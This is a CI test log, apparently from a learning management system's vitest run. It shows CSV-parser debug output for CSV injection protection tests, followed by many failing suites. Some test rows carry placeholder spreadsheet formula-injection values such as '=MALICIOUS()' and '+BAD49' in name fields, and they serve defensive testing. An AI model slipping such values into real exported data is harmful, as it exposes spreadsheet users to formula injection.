2025-11-18T17:36:03.5349494Z     role: [33m3[39m,
2025-11-18T17:36:03.5349690Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5349893Z     password: [33m-1[39m
2025-11-18T17:36:03.5350011Z   }
2025-11-18T17:36:03.5350131Z }
2025-11-18T17:36:03.5350359Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5350650Z   email: [32m'user49@example.com'[39m,
2025-11-18T17:36:03.5350899Z   firstName: [32m'=EVIL49'[39m,
2025-11-18T17:36:03.5351140Z   lastName: [32m'+BAD49'[39m,
2025-11-18T17:36:03.5351340Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5351601Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5351733Z }
2025-11-18T17:36:03.5351747Z 
2025-11-18T17:36:03.5353657Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mSecurity Validation[2m > [22m[2mshould prevent all common spreadsheet formula prefixes[22m[39m
2025-11-18T17:36:03.5354128Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.5354884Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.5355615Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.5355741Z }
2025-11-18T17:36:03.5357151Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.5357363Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5357623Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5358374Z   cellValues: [ [32m'test@example.com'[39m, [32m'=MALICIOUS()'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5358536Z   columnMapping: {
2025-11-18T17:36:03.5358753Z     email: [33m0[39m,
2025-11-18T17:36:03.5358951Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5359160Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5359343Z     role: [33m3[39m,
2025-11-18T17:36:03.5359539Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5359738Z     password: [33m-1[39m
2025-11-18T17:36:03.5359856Z   }
2025-11-18T17:36:03.5359976Z }
2025-11-18T17:36:03.5360221Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5360540Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.5360839Z   firstName: [32m'=MALICIOUS()'[39m,
2025-11-18T17:36:03.5361119Z   lastName: [32m'Normal'[39m,
2025-11-18T17:36:03.5361337Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5361606Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5361737Z }
2025-11-18T17:36:03.5361990Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.5362691Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.5363372Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.5363498Z }
2025-11-18T17:36:03.5364674Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.5364871Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5365080Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5365807Z   cellValues: [ [32m'test@example.com'[39m, [32m'+MALICIOUS()'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5365970Z   columnMapping: {
2025-11-18T17:36:03.5366179Z     email: [33m0[39m,
2025-11-18T17:36:03.5366397Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5366612Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5367278Z     role: [33m3[39m,
2025-11-18T17:36:03.5367473Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5367684Z     password: [33m-1[39m
2025-11-18T17:36:03.5367801Z   }
2025-11-18T17:36:03.5367917Z }
2025-11-18T17:36:03.5368164Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5368468Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.5368755Z   firstName: [32m'+MALICIOUS()'[39m,
2025-11-18T17:36:03.5369025Z   lastName: [32m'Normal'[39m,
2025-11-18T17:36:03.5369243Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5369502Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5369620Z }
2025-11-18T17:36:03.5369861Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.5370570Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.5371286Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.5371410Z }
2025-11-18T17:36:03.5372625Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.5372832Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5373065Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5373804Z   cellValues: [ [32m'test@example.com'[39m, [32m'-MALICIOUS()'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5374167Z   columnMapping: {
2025-11-18T17:36:03.5374380Z     email: [33m0[39m,
2025-11-18T17:36:03.5374578Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5374778Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5374956Z     role: [33m3[39m,
2025-11-18T17:36:03.5375139Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5375336Z     password: [33m-1[39m
2025-11-18T17:36:03.5375450Z   }
2025-11-18T17:36:03.5375572Z }
2025-11-18T17:36:03.5375801Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5376084Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.5376367Z   firstName: [32m'-MALICIOUS()'[39m,
2025-11-18T17:36:03.5376630Z   lastName: [32m'Normal'[39m,
2025-11-18T17:36:03.5377038Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5377299Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5377423Z }
2025-11-18T17:36:03.5377652Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.5378366Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.5379097Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.5379237Z }
2025-11-18T17:36:03.5380505Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.5380716Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5380960Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5381727Z   cellValues: [ [32m'test@example.com'[39m, [32m'@MALICIOUS()'[39m, [32m'Normal'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5381907Z   columnMapping: {
2025-11-18T17:36:03.5382132Z     email: [33m0[39m,
2025-11-18T17:36:03.5382345Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5382536Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5382719Z     role: [33m3[39m,
2025-11-18T17:36:03.5382904Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5383129Z     password: [33m-1[39m
2025-11-18T17:36:03.5383253Z   }
2025-11-18T17:36:03.5383382Z }
2025-11-18T17:36:03.5383644Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5383943Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.5384229Z   firstName: [32m'@MALICIOUS()'[39m,
2025-11-18T17:36:03.5384476Z   lastName: [32m'Normal'[39m,
2025-11-18T17:36:03.5384674Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5384927Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5385043Z }
2025-11-18T17:36:03.5385057Z 
2025-11-18T17:36:03.5387093Z [90mstdout[2m | __tests__/utils/csvInjectionCore.test.ts[2m > [22m[2mCSV Injection Protection - Core Functionality[2m > [22m[2mSecurity Validation[2m > [22m[2mshould maintain data integrity for legitimate data[22m[39m
2025-11-18T17:36:03.5387579Z [CSV-PARSER] Column detection: {
2025-11-18T17:36:03.5388308Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:36:03.5389036Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:36:03.5389177Z }
2025-11-18T17:36:03.5390387Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:36:03.5390606Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5390861Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5391702Z   cellValues: [ [32m'test@example.com'[39m, [32m'José María'[39m, [32m'García-López'[39m, [32m'docente'[39m ],
2025-11-18T17:36:03.5391862Z   columnMapping: {
2025-11-18T17:36:03.5392088Z     email: [33m0[39m,
2025-11-18T17:36:03.5392310Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5392516Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5392714Z     role: [33m3[39m,
2025-11-18T17:36:03.5392904Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5393118Z     password: [33m-1[39m
2025-11-18T17:36:03.5393243Z   }
2025-11-18T17:36:03.5393373Z }
2025-11-18T17:36:03.5393622Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5394147Z   email: [32m'test@example.com'[39m,
2025-11-18T17:36:03.5394456Z   firstName: [32m'José María'[39m,
2025-11-18T17:36:03.5394741Z   lastName: [32m'García-López'[39m,
2025-11-18T17:36:03.5394957Z   role: [32m'docente'[39m,
2025-11-18T17:36:03.5395201Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5395322Z }
2025-11-18T17:36:03.5395514Z [CSV-PARSER] Parsing row: {
2025-11-18T17:36:03.5395719Z   totalCells: [33m4[39m,
2025-11-18T17:36:03.5396473Z   cellValues: [ [32m'user@example.com'[39m, [32m'María José'[39m, [32m"O'Connor"[39m, [32m'admin'[39m ],
2025-11-18T17:36:03.5396641Z   columnMapping: {
2025-11-18T17:36:03.5397043Z     email: [33m0[39m,
2025-11-18T17:36:03.5397253Z     firstName: [33m1[39m,
2025-11-18T17:36:03.5397442Z     lastName: [33m2[39m,
2025-11-18T17:36:03.5397625Z     role: [33m3[39m,
2025-11-18T17:36:03.5397806Z     rut: [33m-1[39m,
2025-11-18T17:36:03.5398024Z     password: [33m-1[39m
2025-11-18T17:36:03.5398216Z   }
2025-11-18T17:36:03.5398348Z }
2025-11-18T17:36:03.5398611Z [CSV-PARSER] Extracted values: {
2025-11-18T17:36:03.5398917Z   email: [32m'user@example.com'[39m,
2025-11-18T17:36:03.5399210Z   firstName: [32m'María José'[39m,
2025-11-18T17:36:03.5399474Z   lastName: [32m"O'Connor"[39m,
2025-11-18T17:36:03.5399686Z   role: [32m'admin'[39m,
2025-11-18T17:36:03.5399937Z   password: [32m'MISSING'[39m
2025-11-18T17:36:03.5400062Z }
2025-11-18T17:36:03.5400076Z 
2025-11-18T17:36:03.5400896Z  [32m✓[39m __tests__/utils/csvInjectionCore.test.ts [2m ([22m[2m13 tests[22m[2m)[22m[90m 26[2mms[22m[39m
2025-11-18T17:36:04.2454510Z  [33m❯[39m e2e/tests/reports-analytics-minimal.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:36:04.6773800Z  [33m❯[39m __tests__/api/transformation/area-questions.test.ts [2m ([22m[2m9 tests[22m [2m|[22m [31m9 failed[39m[2m)[22m[90m 52[2mms[22m[39m
2025-11-18T17:36:04.6778079Z [31m   [33m❯[31m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mPersonalización área[2m > [22mshould return 44 sections for personalizacion[39m
2025-11-18T17:36:04.6780406Z [31m     → fetch failed[39m
2025-11-18T17:36:04.6781522Z [31m   [33m❯[31m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mPersonalización área[2m > [22mshould have correct structure for each section[39m
2025-11-18T17:36:04.6782329Z [31m     → fetch failed[39m
2025-11-18T17:36:04.6783349Z [31m   [33m❯[31m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mAprendizaje área[2m > [22mshould return 68 sections for aprendizaje[39m
2025-11-18T17:36:04.6784438Z [31m     → fetch failed[39m
2025-11-18T17:36:04.6785485Z [31m   [33m❯[31m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mAprendizaje área[2m > [22mshould have 6 objetivos with correct distribution[39m
2025-11-18T17:36:04.6786259Z [31m     → fetch failed[39m
2025-11-18T17:36:04.6787500Z [31m   [33m❯[31m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mError handling[2m > [22mshould return 400 for invalid área[39m
2025-11-18T17:36:04.6788611Z [31m     → fetch failed[39m
2025-11-18T17:36:04.6790608Z [31m   [33m❯[31m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mError handling[2m > [22mshould return 400 when area parameter is missing[39m
2025-11-18T17:36:04.6792125Z [31m     → fetch failed[39m
2025-11-18T17:36:04.6793821Z [31m   [33m❯[31m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mError handling[2m > [22mshould return 405 for non-GET methods[39m
2025-11-18T17:36:04.6795040Z [31m     → fetch failed[39m
2025-11-18T17:36:04.6797412Z [31m   [33m❯[31m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mData consistency[2m > [22mshould have exactly 4 sections per acción (Personalización)[39m
2025-11-18T17:36:04.6798866Z [31m     → fetch failed[39m
2025-11-18T17:36:04.6800718Z [31m   [33m❯[31m __tests__/api/transformation/area-questions.test.ts[2m > [22mGET /api/transformation/area-questions[2m > [22mData consistency[2m > [22mshould have exactly 4 sections per acción (Aprendizaje)[39m
2025-11-18T17:36:04.6802062Z [31m     → fetch failed[39m
2025-11-18T17:36:05.1965598Z  [33m❯[39m __tests__/notificationsPage.test.tsx [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:36:05.6659238Z  [33m❯[39m __tests__/bibliography-image.test.tsx [2m ([22m[2m5 tests[22m [2m|[22m [31m5 failed[39m[2m)[22m[90m 9[2mms[22m[39m
2025-11-18T17:36:05.6661601Z [31m   [33m❯[31m __tests__/bibliography-image.test.tsx[2m > [22mBibliographyBlockEditor - Image Support[2m > [22mshould render Add Image button[39m
2025-11-18T17:36:05.6663174Z [31m     → document is not defined[39m
2025-11-18T17:36:05.6666161Z [31m   [33m❯[31m __tests__/bibliography-image.test.tsx[2m > [22mBibliographyBlockEditor - Image Support[2m > [22mshould add new image item when Add Image button is clicked[39m
2025-11-18T17:36:05.6667239Z [31m     → document is not defined[39m
2025-11-18T17:36:05.6668167Z [31m   [33m❯[31m __tests__/bibliography-image.test.tsx[2m > [22mBibliographyBlockEditor - Image Support[2m > [22mshould validate image file type on upload[39m
2025-11-18T17:36:05.6668888Z [31m     → document is not defined[39m
2025-11-18T17:36:05.6669791Z [31m   [33m❯[31m __tests__/bibliography-image.test.tsx[2m > [22mBibliographyBlockEditor - Image Support[2m > [22mshould show image preview when uploaded[39m
2025-11-18T17:36:05.6670466Z [31m     → document is not defined[39m
2025-11-18T17:36:05.6671327Z [31m   [33m❯[31m __tests__/bibliography-image.test.tsx[2m > [22mBibliographyBlockEditor - Image Support[2m > [22mshould display image icon in preview mode[39m
2025-11-18T17:36:05.6672012Z [31m     → document is not defined[39m
2025-11-18T17:36:06.0463078Z  [32m✓[39m __tests__/lib/transformation/contextBuilder.test.ts [2m ([22m[2m3 tests[22m[2m)[22m[90m 8[2mms[22m[39m
2025-11-18T17:36:06.5089376Z  [33m❯[39m __tests__/pages/admin/feedback.test.tsx [2m ([22m[2m1 test[22m [2m|[22m [31m1 failed[39m[2m)[22m[90m 7[2mms[22m[39m
2025-11-18T17:36:06.5091638Z [31m   [33m❯[31m __tests__/pages/admin/feedback.test.tsx[2m > [22mFeedbackDashboard[2m > [22mrenders feedback data and stats after loading[39m
2025-11-18T17:36:06.5092878Z [31m     → renderWithAct is not a function[39m
2025-11-18T17:36:06.8917923Z  [32m✓[39m __tests__/notificationPermissions.test.ts [2m ([22m[2m14 tests[22m[2m)[22m[90m 8[2mms[22m[39m
2025-11-18T17:36:07.2759272Z  [32m✓[39m __tests__/lib/transformation/interactionService.test.ts [2m ([22m[2m3 tests[22m[2m)[22m[90m 9[2mms[22m[39m
2025-11-18T17:36:07.2763352Z [90mstderr[2m | __tests__/lib/transformation/interactionService.test.ts[2m > [22m[2mpersistTransformationInteraction[2m > [22m[2mtrunca historial a 50 mensajes y registra resumen[22m[39m
2025-11-18T17:36:07.2765262Z [transformation] Assessment assessment-1 alcanzó el límite de historial (50).
2025-11-18T17:36:07.2765804Z 
2025-11-18T17:36:08.0088496Z  [33m❯[39m e2e/tests/supervisor-basic.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:36:08.3942974Z  [33m❯[39m components/blocks/__tests__/BlockRenderer.test.tsx [2m ([22m[2m3 tests[22m [2m|[22m [31m3 failed[39m[2m)[22m[90m 8[2mms[22m[39m
2025-11-18T17:36:08.3945315Z [31m   [33m❯[31m components/blocks/__tests__/BlockRenderer.test.tsx[2m > [22mBlockRenderer Component[2m > [22mrenders a text block and calls onChange when textarea is edited[39m
2025-11-18T17:36:08.3946619Z [31m     → document is not defined[39m
2025-11-18T17:36:08.3949022Z [31m   [33m❯[31m components/blocks/__tests__/BlockRenderer.test.tsx[2m > [22mBlockRenderer Component[2m > [22mrenders a video block and calls onChange when input is edited[39m
2025-11-18T17:36:08.3950468Z [31m     → document is not defined[39m
2025-11-18T17:36:08.3951390Z [31m   [33m❯[31m components/blocks/__tests__/BlockRenderer.test.tsx[2m > [22mBlockRenderer Component[2m > [22mrenders fallback UI for an unknown block type[39m
2025-11-18T17:36:08.3952094Z [31m     → document is not defined[39m
2025-11-18T17:36:08.8297565Z  [33m❯[39m __tests__/profileCompletion.test.tsx [2m ([22m[2m3 tests[22m [2m|[22m [31m3 failed[39m[2m)[22m[90m 9[2mms[22m[39m
2025-11-18T17:36:08.8303882Z [31m   [33m❯[31m __tests__/profileCompletion.test.tsx[2m > [22mProfile Completion Routing[2m > [22mshould redirect to profile page when user is logged in but profile is incomplete[39m
2025-11-18T17:36:08.8305238Z [31m     → document is not defined[39m
2025-11-18T17:36:08.8307171Z [31m   [33m❯[31m __tests__/profileCompletion.test.tsx[2m > [22mProfile Completion Routing[2m > [22mshould redirect to dashboard when user is logged in and profile is complete[39m
2025-11-18T17:36:08.8308510Z [31m     → document is not defined[39m
2025-11-18T17:36:08.8309956Z [31m   [33m❯[31m __tests__/profileCompletion.test.tsx[2m > [22mProfile Completion Routing[2m > [22mshould not redirect when user is not logged in[39m
2025-11-18T17:36:08.8310802Z [31m     → document is not defined[39m
2025-11-18T17:36:09.2865129Z  [33m❯[39m __tests__/components/feedback/FeedbackButton.test.tsx [2m ([22m[2m6 tests[22m [2m|[22m [31m6 failed[39m[2m)[22m[90m 11[2mms[22m[39m
2025-11-18T17:36:09.2867753Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mrenders the floating button[39m
2025-11-18T17:36:09.2868999Z [31m     → renderWithAct is not a function[39m
2025-11-18T17:36:09.2870445Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mhas correct styling classes[39m
2025-11-18T17:36:09.2871585Z [31m     → renderWithAct is not a function[39m
2025-11-18T17:36:09.2873014Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mcontains the MessageCircle icon[39m
2025-11-18T17:36:09.2874091Z [31m     → renderWithAct is not a function[39m
2025-11-18T17:36:09.2942828Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mopens feedback modal when clicked[39m
2025-11-18T17:36:09.2943981Z [31m     → renderWithAct is not a function[39m
2025-11-18T17:36:09.2945859Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mhas pulse animation class[39m
2025-11-18T17:36:09.2947151Z [31m     → renderWithAct is not a function[39m
2025-11-18T17:36:09.2948650Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mremoves pulse animation after interaction[39m
2025-11-18T17:36:09.2949867Z [31m     → renderWithAct is not a function[39m
2025-11-18T17:36:09.7933509Z  [32m✓[39m components/admin/__tests__/UnifiedUserManagement.roles.test.ts [2m ([22m[2m3 tests[22m[2m)[22m[90m 4[2mms[22m[39m
2025-11-18T17:36:10.1642883Z  [33m❯[39m __tests__/login.test.tsx [2m ([22m[2m2 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[90m 8[2mms[22m[39m
2025-11-18T17:36:10.1645040Z [31m   [33m❯[31m __tests__/login.test.tsx[2m > [22mLoginPage[2m > [22mrenders the login form elements[39m
2025-11-18T17:36:10.1645908Z [31m     → document is not defined[39m
2025-11-18T17:36:10.5368133Z  [33m❯[39m __tests__/dummy.test.tsx [2m ([22m[2m1 test[22m [2m|[22m [31m1 failed[39m[2m)[22m[90m 7[2mms[22m[39m
2025-11-18T17:36:10.5369393Z [31m   [33m❯[31m __tests__/dummy.test.tsx[2m > [22mrenders a dummy component[39m
2025-11-18T17:36:10.5370162Z [31m     → document is not defined[39m
2025-11-18T17:36:10.9003993Z  [32m✓[39m __tests__/integration/role-based-access.test.tsx [2m ([22m[2m1 test[22m[2m)[22m[90m 3[2mms[22m[39m
2025-11-18T17:36:10.9117456Z 
2025-11-18T17:36:10.9138587Z [31m⎯⎯⎯⎯⎯⎯[1m[7m Failed Suites 32 [27m[22m⎯⎯⎯⎯⎯⎯[39m
2025-11-18T17:36:10.9139287Z 
2025-11-18T17:36:10.9142993Z [31m[1m[7m FAIL [27m[22m[39m __tests__/notificationsPage.test.tsx [2m[ __tests__/notificationsPage.test.tsx ][22m
2025-11-18T17:36:10.9173621Z [31m[1mReferenceError[22m: supabase is not defined[39m
2025-11-18T17:36:10.9178687Z [36m [2m❯[22m __tests__/notificationsPage.test.tsx:[2m49:24[22m[39m
2025-11-18T17:36:10.9214717Z     [90m 47| [39mdescribe('Notifications Page', () => {
2025-11-18T17:36:10.9217580Z     [90m 48| [39m  let mockRouter: any;
2025-11-18T17:36:10.9237987Z     [90m 49| [39m  const mockSupabase = supabase as any;
2025-11-18T17:36:10.9239380Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:10.9240735Z     [90m 50| [39m
2025-11-18T17:36:10.9241938Z     [90m 51| [39m  beforeEach(() => {
2025-11-18T17:36:10.9243013Z 
2025-11-18T17:36:10.9244277Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[1/545]⎯[22m[39m
2025-11-18T17:36:10.9245407Z 
2025-11-18T17:36:10.9249371Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx [2m[ __tests__/contracts/invoice-deletion-simple.test.tsx ][22m
2025-11-18T17:36:10.9251863Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.integration.test.tsx [2m[ __tests__/contracts/invoice-deletion.integration.test.tsx ][22m
2025-11-18T17:36:10.9254895Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx [2m[ __tests__/contracts/invoice-deletion.test.tsx ][22m
2025-11-18T17:36:10.9258122Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx [2m[ __tests__/integration/password-reset-flow.test.tsx ][22m
2025-11-18T17:36:10.9261154Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/PasswordResetModal.test.tsx [2m[ components/__tests__/PasswordResetModal.test.tsx ][22m
2025-11-18T17:36:10.9264018Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx [2m[ tests/workspace/discussionLinkUI.test.tsx ][22m
2025-11-18T17:36:10.9288505Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx [2m[ __tests__/components/feedback/FeedbackDetail.test.tsx ][22m
2025-11-18T17:36:10.9291664Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx [2m[ __tests__/components/feedback/FeedbackModal.test.tsx ][22m
2025-11-18T17:36:10.9295368Z [31m[1m[7m FAIL [27m[22m[39m __tests__/pages/admin/user-management-password-reset.test.tsx [2m[ __tests__/pages/admin/user-management-password-reset.test.tsx ][22m
2025-11-18T17:36:10.9298179Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:36:10.9300927Z [90m [2m❯[22m detachClipboardStubFromView node_modules/@testing-library/user-event/dist/esm/utils/dataTransfer/Clipboard.js:[2m120:32[22m[39m
2025-11-18T17:36:10.9303964Z [90m [2m❯[22m node_modules/@testing-library/user-event/dist/esm/utils/dataTransfer/Clipboard.js:[2m159:20[22m[39m
2025-11-18T17:36:10.9305695Z 
2025-11-18T17:36:10.9307237Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[2/545]⎯[22m[39m
2025-11-18T17:36:10.9308400Z 
2025-11-18T17:36:10.9310070Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/feedback-system.test.ts[2m > [22mFeedback System Integration
2025-11-18T17:36:10.9312307Z [31m[1mTypeError[22m: vi.mocked(...).mockResolvedValueOnce is not a function[39m
2025-11-18T17:36:10.9314350Z [36m [2m❯[22m __tests__/integration/feedback-system.test.ts:[2m17:8[22m[39m
2025-11-18T17:36:10.9338777Z     [90m 15| [39m    // Mock the auth.admin.createUser responses
2025-11-18T17:36:10.9339660Z     [90m 16| [39m    vi.mocked(supabase.auth.admin.createUser)
2025-11-18T17:36:10.9340401Z     [90m 17| [39m      .mockResolvedValueOnce({
2025-11-18T17:36:10.9340994Z     [90m   | [39m       [31m^[39m
2025-11-18T17:36:10.9342122Z     [90m 18| [39m        data: { user: { id: testUserId, email: 'test-user@example.com'…
2025-11-18T17:36:10.9342911Z     [90m 19| [39m        error: null
2025-11-18T17:36:10.9343204Z 
2025-11-18T17:36:10.9343620Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[3/545]⎯[22m[39m
2025-11-18T17:36:10.9343951Z 
2025-11-18T17:36:10.9344980Z [31m[1m[7m FAIL [27m[22m[39m __tests__/services/quizSubmissions.test.js [2m[ __tests__/services/quizSubmissions.test.js ][22m
2025-11-18T17:36:10.9346197Z [31m[1mSyntaxError[22m: Unexpected token 'export'[39m
2025-11-18T17:36:10.9347563Z [36m [2m❯[22m __tests__/services/quizSubmissions.test.js:[2m2:24[22m[39m
2025-11-18T17:36:10.9348619Z     [90m  1| [39mconst { createClient } = require('@supabase/supabase-js');
2025-11-18T17:36:10.9349652Z     [90m  2| [39mconst { submitQuiz } = require('../../lib/services/quizSubmissions');
2025-11-18T17:36:10.9350458Z     [90m   | [39m                       [31m^[39m
2025-11-18T17:36:10.9350974Z     [90m  3| [39m
2025-11-18T17:36:10.9351487Z     [90m  4| [39m// Load environment variables
2025-11-18T17:36:10.9351822Z 
2025-11-18T17:36:10.9353871Z [33mModule /home/runner/work/fne-lms/fne-lms/lib/services/quizSubmissions.js:73 seems to be an ES Module but shipped in a CommonJS package. To fix this issue, change the file extension to .mjs or add "type": "module" in your package.json.[39m
2025-11-18T17:36:10.9355711Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[4/545]⎯[22m[39m
2025-11-18T17:36:10.9356032Z 
2025-11-18T17:36:10.9378336Z [31m[1m[7m FAIL [27m[22m[39m components/__tests__/GroupAssignmentsContent.test.tsx [2m[ components/__tests__/GroupAssignmentsContent.test.tsx ][22m
2025-11-18T17:36:10.9381513Z [31m[1mError[22m: [vitest] There was an error when mocking a module. If you are using "vi.mock" factory, make sure there are no top level variables inside, since this call is hoisted to top of the file. Read more: https://vitest.dev/api/vi.html#vi-mock[39m
2025-11-18T17:36:10.9383775Z [36m [2m❯[22m components/__tests__/GroupAssignmentsContent.test.tsx:[2m242:18[22m[39m
